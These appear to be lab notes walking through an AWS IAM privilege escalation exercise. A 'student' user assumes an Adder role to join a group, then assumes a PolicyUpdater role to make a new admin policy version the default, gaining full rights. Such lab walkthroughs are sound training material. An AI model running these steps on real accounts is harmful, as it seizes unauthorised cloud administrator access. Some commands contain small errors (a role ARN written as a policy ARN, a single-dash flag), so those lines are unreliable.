** Bad combination of Adder and PolicyUpdater role policies **
How to elevate privileges abusing on the combination of Adder and PolicyUpdater role policies

Setting AWS Credentials  
`aws configure`
Checking policies attached  to user  
`aws iam list-attached-user-policies --user-name student`
![[Pasted image 20210503121309.png]]
`aws iam list-user-policies --user-name student`
![[Pasted image 20210503121412.png]]
Trying to create an user - Denied action
`aws iam create-user --user-name Bob`
![[Pasted image 20210503121524.png]]
Checking user policy details
`aws iam get-user-policy --user-name student --policy-name terraform-20210211062254104700000002`
![[Pasted image 20210503121731.png]]
`aws iam list-role-policies --role-name Adder`
`aws iam get-role-policy --role-name Adder --policy-name Adduser`
![[Pasted image 20210503121946.png]]

Assuming Adder role
`aws sts assume-role --role-arn arn:aws:iam::645723898191:role/Adder --role-session-name adder_test`
![[Pasted image 20210503122209.png]]
Export credentials to environments variables
![[Pasted image 20210503122312.png]]
Show the identity
`aws sts get-caller-identity`

Adding user to a group
`aws iam add-user-to-group --group-name Printers --user-name student`
Unset environment variables
`unset AWS_ACCESS_KEY_ID`
`unset AWS_SECRET_ACCESS_KEY`
`unset AWS_SESSION_TOKEN`
List again user groups
`aws iam list-groups-for-user --user-name student`
![[Pasted image 20210503122754.png]]

Listing information about policies attached to PolicyUpdater role
`aws iam list-role-policies --role-name PolicyUpdater`
`aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion`
![[Pasted image 20210503123245.png]]
Getting policy by version
`aws iam list-attached-group-policies --group-name Printers`
`aws iam get-policy --policy-arn arn:aws:iam::645723898191:policy/Print`
![[Pasted image 20210503123503.png]]
`aws iam get-policy-version -policy-arn arn:aws:iam::645723898191:policy/Print --version-id v1`
![[Pasted image 20210503123609.png]]

Assuming PolicyUpdater role
`aws sts assume-role --role-arn arn:aws:iam::645723898191:policy/PolicyUpdater --role-session-name policy_test`
Export its credentials to environment variables
Show the identity
`aws sts get-caller-identity`

Creating new policy version
`nano newAdminPolicy.json`
`aws iam create-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print --policy-document file://newAdminPolicy.json --set-as-default`
![[Pasted image 20210503124226.png]]
Show policies
`aws iam get-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print --version-id v2`
`aws iam list-attached-group-policies --group-name Printers`
![[Pasted image 20210503124455.png]]

Confirming privileged access
Creating a new user - success
`aws iam create-user --user-name Bob`
![[Pasted image 20210503124652.png]]
